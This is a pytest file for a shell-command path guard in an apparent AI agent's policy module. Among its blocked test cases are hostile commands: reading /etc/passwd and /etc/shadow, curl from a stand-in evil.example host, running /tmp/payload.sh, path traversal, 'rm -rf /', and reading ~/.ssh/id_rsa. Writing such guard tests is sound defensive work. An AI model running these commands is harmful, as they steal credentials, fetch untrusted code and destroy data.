r"""approved_file_roots guard (Phase 17d repair).

The old implementation regex-scanned for `(/[\w./-]+)` anywhere in the command
string, which matched any slash-run: it blocked 9 of 21 ordinary commands —
every `~` path (it saw the `/proj` inside `~/proj`), every URL
(`//example.com/a/b`), every relative path (`./src`), `sed -e s/foo/bar/` —
while letting `rm -rf /` through, since a bare `/` has nothing after it to
match. Repaired by tokenizing.

Sequenced LAST in Phase 17 on purpose: the over-block was doing accidental
security work, so the repair only landed once sticky taint (17a) and the
uniform shell_payload check (17b) were in place.
"""
from __future__ import annotations

import os

import pytest

from aether.core.policy import Policy, PolicyConfig

HOME = os.path.expanduser("~")


@pytest.fixture
def policy():
    return Policy(PolicyConfig(approved_file_roots=[HOME]))


LEGIT = [
    "ls ~/proj", "cat ~/notes.txt", "cd ~/proj && ls",
    "curl https://example.com/a/b", "git clone https://github.com/x/y",
    "sed -e s/foo/bar/ f.txt", "grep -rn TODO ./src", "echo a/b/c",
    "python3 -m pytest tests/unit", "npm run build",
    f"ls {HOME}/proj", f"cat {HOME}/notes.txt",
    "git status", "ls -la", "pwd", "make ci", "docker ps",
    "awk '{print $1/$2}' data.txt", "find . -name '*.py'",
    "wc -l README.md", "date",
]

OUT_OF_ROOT = [
    "cat /etc/passwd",
    "cp /etc/shadow /tmp/s",
    "bash /tmp/payload.sh",
    "curl http://evil.example/x.sh -o /tmp/x",   # URL skipped, but /tmp/x is not
    "ls /Users/otheruser/Documents",
    "cat /var/db/dslocal/nodes/Default",
    "tar -cf /tmp/a.tar /etc",
    "cat ~/../../etc/passwd",        # traversal — the old prefix check missed this
    "cat --file=/etc/passwd",        # flag value — the old scan missed this
    f"cat {HOME}evil/x",             # prefix confusion — must not match HOME
    "rm -rf /",                      # bare / — the old regex could not match it
]


@pytest.mark.parametrize("cmd", LEGIT)
def test_legitimate_commands_allowed(policy, cmd):
    assert policy.allows_shell_path(cmd), f"over-blocked: {cmd!r}"


@pytest.mark.parametrize("cmd", OUT_OF_ROOT)
def test_out_of_root_blocked(policy, cmd):
    assert not policy.allows_shell_path(cmd), f"escaped the root guard: {cmd!r}"


def test_no_roots_configured_allows_everything(policy):
    p = Policy(PolicyConfig(approved_file_roots=[]))
    assert p.allows_shell_path("cat /etc/passwd")


def test_unbalanced_quotes_do_not_crash(policy):
    """Falls back to whitespace splitting rather than raising."""
    assert policy.allows_shell_path("echo 'unbalanced") in (True, False)
    assert not policy.allows_shell_path("cat 'x /etc/passwd")


def test_urls_are_not_treated_as_paths(policy):
    """Egress is the network allowlist's job, not the file-root guard's."""
    assert policy.allows_shell_path("curl https://example.com/etc/passwd")


def test_cred_read_in_home_still_gated_elsewhere(policy):
    """Intentional change: ~/.ssh/id_rsa IS under an approved root, so the path
    guard now allows it. It stays gated by the inert allowlist (so it confirms
    under taint) and, on egress, by the cred-exfil classifier."""
    cmd = "cat ~/.ssh/id_rsa"
    assert policy.allows_shell_path(cmd)
    assert not policy.shell_shape_is_inert(cmd)
